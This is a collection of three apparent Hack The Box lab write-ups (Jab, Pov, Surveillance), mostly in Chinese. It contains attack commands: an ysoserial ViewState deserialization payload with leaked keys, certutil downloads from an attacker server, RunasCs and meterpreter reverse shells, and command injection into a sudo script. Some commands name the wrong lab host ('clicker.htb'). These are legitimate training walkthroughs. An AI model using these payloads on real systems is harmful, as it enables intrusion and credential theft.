# [HTB]Jab #DCOM #AS-REP
- **初始侦察**：使用**nmap**扫描发现开放端口88、445和5222。
- **SMB尝试**：尝试使用**smbclient**和**crackmapexec**检查共享文件夹，但遇到错误。
- **Jabber/XMPP服务**：发现运行着**Jabber**和**XMPP**聊天服务。
- **Pidgin客户端**：通过**Pidgin**客户端连接到XMPP服务并注册账户。
- **用户搜索**：利用Pidgin的用户搜索功能，通过输入星号(*)进行高级搜索，获取用户列表。
- **AS-REP Roasting**：使用**Impacket**工具中的**GetNPUsers.py**进行AS-REP Roasting获取用户哈希。***\*None PreAuth Users***
- **密码破解**：使用**john**或**hashcat**结合**rockyou.txt**字典文件破解哈希。
- **远程连接**：使用获取的凭证通过**dcomexec.py**工具建立远程连接。***\*DCOM组件利用***
- **漏洞利用**：利用CVE-2023–32315漏洞，通过上传恶意**.jar**文件到Openfire admin console实现远程代码执行（RCE）。
- **端口转发**：使用**Chisel**设置端口转发以访问本地端口9090和9091。***\*Chisel的使用***
- **获取根权限**：通过Openfire admin console的RCE获取系统（root）权限，并查看root.txt文件。
# [HTB]Pov #\.Net反序列化
```Credential
alaading
f8gQ8fynP44ek1m3
```
## Enumeration and Analysis 枚举和分析

### Nmap
让我们使用以下命令运行一个简单的 Nmap 扫描：
```bash
nmap -sC -sV IP
```

### Directory Enumeration 目录枚举
让我们使用以下命令进行目录枚举：
```bash
dirsearch -u clicker.htb -e*
```
或者
```bash
gobuster dir -u http://pov.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```
我们没有发现任何有趣的东西。

### Subdomain Enumeration 子域枚举
让我们使用以下命令执行 DNS 枚举：
```bash
gobuster dns -d clicker.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 20
```
但是我们在扫描中没有发现任何有趣的东西。

## Initial Foothold 初始立足点

### Port — 80 端口 — 80
在枚举 http://pov.htb 时，我们在页脚中找到了用户名和子域 http://dev.pov.htb 。

让我们将其添加到主机并检查它。此外，在 http://dev.pov.htb 上，还有一个文件下载选项。

Upon intercepting that request, we can see a list of parameters like below:

```plaintext
__EVENTTARGET=download&
__EVENTARGUMENT=&
__VIEWSTATE=DY%2FikU7FyXJZCW0op4Kz6Bgqd4o%2FFtEfEsiowrOTlRKwk96TfCKJt6cwtTy82KRl93H2SNf4FCvmzZuhMaKfKMCbzZg%3D&
__VIEWSTATEGENERATOR=8E0F0FA3&
__EVENTVALIDATION=eGOIJz%2BJA4RbAfYNdIjP%2FXmYDtUaz97UabMUsYu%2Bg8ppRuevK%2FWEufVY9E0M8KqssT57LzrVSlgu%2FzTmjoojoiS270xt9sBSLasZ2CSk2sh4uF3oBk9hMWE%2FILb9D20b1kQDEA%3D%3D
&file=cv.pdf
```

我们可以尝试将文件名从“cv.pdf”更改为另一个敏感文件名。当我们将文件名更改为“/web.config”时，我们会收到以下响应：

```xml
<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>
```

## User.txt 用户文档

经过研究，我找到了一种利用这个漏洞的方法。

首先，我们需要使用以下命令创建有效负载：

```bash
python3 Reverse_Shell_for_Power_Shell.py IP 4444
```

打开 Windows 虚拟机，从 [链接] 下载ysoserial.exe，使用命令提示符导航到该文件夹，按以下语法粘贴有效负载，然后按 Enter。

```plaintext
ysoserial.exe -p ViewState -g TextFormattingRunProperties --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio/default.aspx" -c "Paste_the_payload_here"
```

现在，单击 http://dev.pov.htb 上的“下载简历”按钮，捕获请求，粘贴我们之前为“__VIEWSTATE”参数创建的代码，然后发送请求。

如果您正确完成了所有操作，您将收到一个连接。

我们现在处于“sfitz”的外壳中。我在 sfitz 的 Documents 文件夹中发现了一个有趣的文件，其中包含特权用户“alaading”的密码。

使用以下命令获取该密码：

```plaintext
echo > pass.txt
$EncryptedString = Get-Content .\pass.txt
$SecureString = ConvertTo-SecureString $EncryptedString
$Credential = New-Object System.Management.Automation.PSCredential -ArgumentList "username",$SecureString
echo $Credential.GetNetworkCredential().password
```

下载“RunasCs.exe”，“psgetsys.ps1”和“EnableAllTokenPrivs.ps1”。

打开下载文件夹中的终端，然后键入以下命令以启动HTTP服务器，以将文件从我们的机器传输到Windows：

```bash
python3 -m http.server
```

该文件的链接类似于 http：//YOUR_IP：8000/filename。现在，使用以下命令在受害计算机上下载文件：

```plaintext
certutil.exe -

urlcache -split -f "http://IP:8000/EnableAllTokenPrivs.ps1" ".\EnableAllTokenPrivs.ps1"
certutil.exe -urlcache -split -f "http://IP:8000/psgetsys.ps1" ".\psgetsys.ps1"
certutil.exe -urlcache -split -f "http://IP:8000/RunasCs.exe" ".\RunasCs.exe"
```

现在，在您的计算机上启动侦听器，并在受害计算机上键入以下命令，以使用提供的凭据访问 Alaading 的帐户：

```plaintext
.\RunasCs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r YOUR_IP:4444
```

使用以下命令查看标志或手动将目录更改为 alaading 的目录：

```plaintext
type C:\Users\alaading\Desktop\user.txt
```

## Privilege Escalation 权限提升

如果我们键入“whoami /priv”，我们可以看到“sedebugPrivilegePoC”权限已被禁用。若要启用此权限的状态，请导航到目录并使用以下命令执行我们在上一节中下载的脚本：

```plaintext
.\psgetsys.ps1
.\EnableAllTokenPrivs.ps1
```

在计算机上，使用以下命令创建 Windows 有效负载：

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=5555 -f exe > exploit.exe
```

将“exploit.exe”移动到我们托管 HTTP 服务器的目录，并使用上述技术将文件发送到受害计算机。在您的机器上配置 Meterpreter，并在受害机器上运行“exploit.exe”。

键入“ps”并找到“winlogon.exe”的 PID。然后键入“migrate PID_VALUE”，然后键入“shell”。现在，您可以以“nt authority\system”的身份访问。

使用以下命令查看标志或手动将目录更改为管理员的目录：

```plaintext
type C:\Users\Administrator\Desktop\root.txt
```

我们已获得管理员标志。
# [HTB] Surveillance
## Lab Info

Lab IP: 10.10.11.245 Lib 应用程序：10.10.11.245

Lab difficulty: medium 实验室难度：中等

Lab OS: Linux 实验室操作系统：Linux

## Enumeration

Starting of with an nmap scan as usual to uncover open ports on target and the services they run.  
像往常一样从 nmap 扫描开始，以发现目标上的开放端口及其运行的服务。

> nmap 10.10.11.245 -sCV — min-rate=1000 -oN nmap.out  
> nmap 10.10.11.245 -sCV — 最小速率 = 1000 -oN nmap.out

Discovered port 80 (http) and port 22 (ssh) [Ignore the other ports serving SimpleHTTPServer, some other players are in the machine transferring files with those ports as we are all on a shared server]. I decided to enumerate port 80 first as it’s the lowest hanging fruit.  
发现端口 80 （http） 和端口 22 （ssh） [忽略其他为 SimpleHTTPServer 提供服务的端口，其他一些玩家正在机器中使用这些端口传输文件，因为我们都在共享服务器上]。我决定首先枚举端口 80，因为它是最容易实现的。

I ‘CURLed’ the header to find the proper hostname, and added it to my hostnames file /etc/hosts.  
我“卷曲”了标头以找到正确的主机名，并将其添加到我的主机名文件 /etc/hosts 中。

![](https://miro.medium.com/v2/resize:fit:700/1*KeAE8HeVssjH19VFiUvtgQ.png)

I decided to run a directory bruteforce on port 80 with ffuf while I go check browser for what functions/suprise port 80 might have for us.  
我决定在端口 80 上使用 ffuf 运行目录暴力破解，同时检查浏览器以了解端口 80 可能为我们提供的功能/支持。

![](https://miro.medium.com/v2/resize:fit:700/1*-5IE7DnnFBMaKStQ5mj6og.png)

I came across this web page with little to no responsiveness, I checked the extension ‘wappalyzer’ (wappalyzer helps understand the technology a certain website is making use of), I noticed the website is making use of CraftCMS amidst numerous other, caught my attention. So, I scrolled down to where there was footer **‘Powered by CraftCMS’,** hovering my mouse on the footer exposes what seem to be the version of the CMS at the extreme left hand corner. I made sense of craftcms 4.4.14  
我遇到了这个网页，几乎没有响应，我检查了扩展程序“wappalyzer”（wappalyzer有助于理解某个网站正在使用的技术），我注意到该网站正在使用CraftCMS在许多其他网站中，引起了我的注意。因此，我向下滚动到页脚“Powered by CraftCMS”的位置，将鼠标悬停在页脚上，在最左上角露出似乎是CMS版本的内容。我理解了 craftcms 4.4.14

![](https://miro.medium.com/v2/resize:fit:700/1*Vqoute0L2FBCw1aypZaqZQ.png)

So I embark on the search for a publicly available exploit POC that might exist for that particular CMS version. I found a POC by a researcher named ‘Faelian’ on his github and realized the vulnerability was assigned a CVE name of [CVE-2023–41892](https://github.com/Faelian/CraftCMS_CVE-2023-41892).  
因此，我开始寻找该特定 CMS 版本可能存在的公开可用的漏洞利用 POC。我在他的 github 上发现了一个名为“Faelian”的研究人员的 POC，并意识到该漏洞被分配了 CVE 名称 CVE-2023–41892 。

## Gaining Shell

I cloned repository and and ran the POC and got a shell albeit unstable. I solved that by running a command in gotten shell to get another reverse shell on a listener by ‘pwncat’ ([https://github.com/calebstewart/pwncat](https://github.com/calebstewart/pwncat))I have running which will stabilize whatever shell it catches.  
我克隆了存储库并运行了 POC，得到了一个 shell，尽管不稳定。我通过在 get shell 中运行命令通过“pwncat”（ [https://github.com/calebstewart/pwncat](https://github.com/calebstewart/pwncat) ）在侦听器上获取另一个反向 shell 解决了这个问题，我正在运行它将稳定它捕获的任何 shell。

![](https://miro.medium.com/v2/resize:fit:700/1*Bxm8ekcNzG-Cv--1NZ5ZvA.png)

I started enumerating right from the directory I found myself, checking every juicy looking file for example the ‘web.config’ that’s in the current directory I got shell into but it holds nothing of importance to us, I changed directory one level back and found a ‘storage’ directory and within it I found a ‘backup’ which also contains a ‘zip’ file.  
我从我找到的目录开始枚举，检查每个看起来多汁的文件，例如我进入 shell 的当前目录中的“web.config”，但它对我们来说并不重要，我将目录更改了一级并找到了一个“存储”目录，在其中我发现了一个“备份”，其中还包含一个“zip”文件。

![](https://miro.medium.com/v2/resize:fit:700/1*X3s1f0_y1jPCz4Xu0R4AtA.png)

I transferred the zipped file into my local machine to unzip and get a feel of what the zipped file may be hiding.  
我将压缩文件传输到本地计算机以解压缩并了解压缩文件可能隐藏的内容。

![](https://miro.medium.com/v2/resize:fit:700/1*UwoIwXV8IKikanviLRXcIw.png)

After extracting the zipped file, I got an sql file and during analysis, I found a users table with some user matthew and its hash.  
提取压缩文件后，我得到了一个 sql 文件，在分析过程中，我发现了一个用户表，其中包含一些用户 matthew 及其哈希值。

![](https://miro.medium.com/v2/resize:fit:700/1*HNpIKi_tGtbNVbqiFW-gtg.png)

Confirmed hash type on [hashes.com](http://hashes.com/) to be SHA256.  
hashes.com 上确认的哈希类型为 SHA256。

![](https://miro.medium.com/v2/resize:fit:700/1*GYr5HT-X9QqAIy9UH-bXqg.png)

I was able to crack the hash for user ‘matthew’ using JohnTheRipper and ssh into matthew.  
我能够使用 JohnTheRipper 破解用户“matthew”的哈希值，然后 ssh 到 matthew 中。

![](https://miro.medium.com/v2/resize:fit:700/1*8UnnNU32r_tVf7gnq9yv2A.png)

Started enumerating common privileges escalation vectors in linux, checked for misconfigured SUID, misconfigured writable sensitive files, common kernel exploit, groups, common sensitive directories, crontabs, e.t.c until I decided to run Linpeas ([https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)). Downloaded onto my local machine and transferred to target.  
开始在 linux 中枚举通用权限升级向量，检查错误配置的 SUID、错误配置的可写敏感文件、常见内核漏洞、组、常见敏感目录、crontabs 等，直到我决定运行 Linpeas （ [https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) ）。下载到我的本地机器上并传输到目标。

I found an nginx web service named ‘zoneminder’ and I found some mysql credentials that seems to be from the same source as storage/backups with password almost having the same strings as ‘zoneminder’  
我找到了一个名为“zoneminder”的nginx Web服务，我发现了一些mysql凭据，这些凭据似乎与存储/备份来自同一来源，密码几乎与“zoneminder”具有相同的字符串

![](https://miro.medium.com/v2/resize:fit:700/1*gC3Dbx6wPfCZuGMMpOtDug.png)

![](https://miro.medium.com/v2/resize:fit:700/1*FKmKNmnVT7WpcoqINoS9VA.png)

Curiosity set in and I decided to research zoneminder, only to found that it is an API that can provide a complete surveillance system circuit.  
好奇心驱使我，决定研究 zoneminder，结果发现它是一个可以提供完整监控系统电路的 API。

I found it running locally and for me to be able to visit it on my machine browser, i had to port forward.  
我发现它在本地运行，为了让我能够在我的机器浏览器上访问它，我必须向前移植。

![](https://miro.medium.com/v2/resize:fit:700/1*QfET2opJRCHMYw8u0yFecg.png)

I found a login page, tried default ‘admin:admin’ combination, did not work, tried basic sqli, none worked still.  
我找到了一个登录页面，尝试了默认的“admin：admin”组合，但不起作用，尝试了基本的 sqli，但仍然无法正常工作。

![](https://miro.medium.com/v2/resize:fit:700/1*AtHA8JPcM1dhN8HgLfA7_A.png)

I decided to search online for publicly available exploit POC for zoneminder and found one by rvizx on his github, ran it gaainst target and got shell as ‘zoneminder’  
我决定在网上搜索 zoneminder 的公开漏洞利用 POC，并在他的 github 上找到了 rvizx 的一个，运行了它的 gaainst 目标并得到 shell 作为“zoneminder”

![](https://miro.medium.com/v2/resize:fit:700/1*6j99dl9Xsihdvgmoe3OaqA.png)

I started enumerating common privileges escalation vectors in linux, checked for misconfigured SUID, misconfigured writable sensitive files, common kernel exploit, groups, common sensitive directories, crontabs, until i tried the command ‘sudo -l’ to check what superuser privilege user zoneminder has and realized he has sudo access to a not so clear perl script.  
我开始枚举 linux 中的常见权限提升向量，检查是否配置错误的 SUID、错误配置的可写敏感文件、常见内核漏洞、组、常见敏感目录、crontabs，直到我尝试命令“sudo -l”检查用户 zoneminder 拥有的超级用户权限，并意识到他可以 sudo 访问一个不太清楚的 perl 脚本。

![](https://miro.medium.com/v2/resize:fit:700/1*5zL3qCA4Wti5R2Wt4wJnJg.png)

As the the weird script is in /usr/bin and is a script starting zm and having a wildcard, I started looking for evry file with that descirption using find command and reading the perl scripts to understand what they can do until I came across zmupdate.pl.  
由于奇怪的脚本位于 /usr/bin 中，并且是一个以 zm 开头并具有通配符的脚本，因此我开始使用 find 命令查找具有该解析的 evry 文件并阅读 perl 脚本以了解它们可以做什么，直到我遇到 zmupdate.pl。

![](https://miro.medium.com/v2/resize:fit:700/0*IsJqGePvcXmpZImf)

I found in it at the top of the code a command help guide.  
我在代码顶部找到了命令帮助指南。

![](https://miro.medium.com/v2/resize:fit:700/0*SRH0QvyScynJBDUR)

I queried the version while providing a random version and the user ‘root’ alone and behold output gave a mysql command that contained a password in it’s query  
我在提供随机版本时查询了版本，用户“root”单独输出了一个 mysql 命令，该命令在其查询中包含密码

![](https://miro.medium.com/v2/resize:fit:700/0*gx70RqRtXiNDlDGL)

— SNIP — — 剪 —

![](https://miro.medium.com/v2/resize:fit:700/0*6tlAfWRaTX9d_Pge)

After spending much time without good results, out of complete curiosity, I decided to chain a command into the user value with the user being empty while using the semicolon to chain. And lo and behold, I got root!  
在花了很多时间没有得到好的结果之后，出于完全的好奇心，我决定将命令链接到用户值中，用户为空，同时使用分号进行链接。瞧，我扎根了！

![](https://miro.medium.com/v2/resize:fit:700/0*ojiPtEikNMlAP8Vn)

But the shell wasn’t stable, I had to exit root for commands I ran to execute.  
但是 shell 不稳定，我必须退出 root 才能执行我运行的命令。

![](https://miro.medium.com/v2/resize:fit:700/0*1o56wb0NuGwUo39N)

So I decided to use busybox to make use of netcat to give me a reverse shell from root.  
所以我决定使用 busybox 来利用 netcat 给我一个来自 root 的反向 shell。

![](https://miro.medium.com/v2/resize:fit:700/0*_g362aYEoB52iYy4)
